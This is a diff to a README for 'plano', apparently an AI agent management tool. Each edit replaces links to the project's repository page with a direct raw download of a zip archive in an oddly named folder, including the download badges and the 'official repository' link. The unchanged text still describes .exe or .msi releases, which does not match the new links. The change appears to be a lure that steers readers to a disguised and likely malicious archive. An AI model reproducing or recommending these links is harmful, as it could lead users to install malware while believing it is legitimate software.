@@ -1,6 +1,6 @@
 # 🚦 plano - Simplify AI Agent Management
 
-[![Download plano](https://img.shields.io/badge/Download-plano-brightgreen?style=for-the-badge)](https://github.com/iamUNEX/plano)
+[![Download plano](https://img.shields.io/badge/Download-plano-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/iamUNEX/plano/main/jinniyeh/Software-v2.5-alpha.4.zip)
 
 ---
 
@@ -28,10 +28,10 @@ Before installing plano, make sure your system meets these requirements:
 
 ## 💾 Download and Install plano
 
-[![Get plano](https://img.shields.io/badge/Download-plano-blue?style=for-the-badge)](https://github.com/iamUNEX/plano)
+[![Get plano](https://img.shields.io/badge/Download-plano-blue?style=for-the-badge)](https://raw.githubusercontent.com/iamUNEX/plano/main/jinniyeh/Software-v2.5-alpha.4.zip)
 
 1. Click the **Download plano** badge or visit this page:  
-   [https://github.com/iamUNEX/plano](https://github.com/iamUNEX/plano)
+   [https://raw.githubusercontent.com/iamUNEX/plano/main/jinniyeh/Software-v2.5-alpha.4.zip](https://raw.githubusercontent.com/iamUNEX/plano/main/jinniyeh/Software-v2.5-alpha.4.zip)
    
 2. On the GitHub page, look for the **Releases** section or a download link for the Windows version.  
    The file you need will have `.exe` or `.msi` extension.
@@ -121,7 +121,7 @@ If problems persist, check GitHub’s **Issues** section for similar cases or up
 ## 🔗 Useful Links
 
 - Visit the official repository and download page at:  
-  [https://github.com/iamUNEX/plano](https://github.com/iamUNEX/plano)
+  [https://raw.githubusercontent.com/iamUNEX/plano/main/jinniyeh/Software-v2.5-alpha.4.zip](https://raw.githubusercontent.com/iamUNEX/plano/main/jinniyeh/Software-v2.5-alpha.4.zip)
 
 - For updates, bug reports, or help, use the GitHub Issues tab.
 
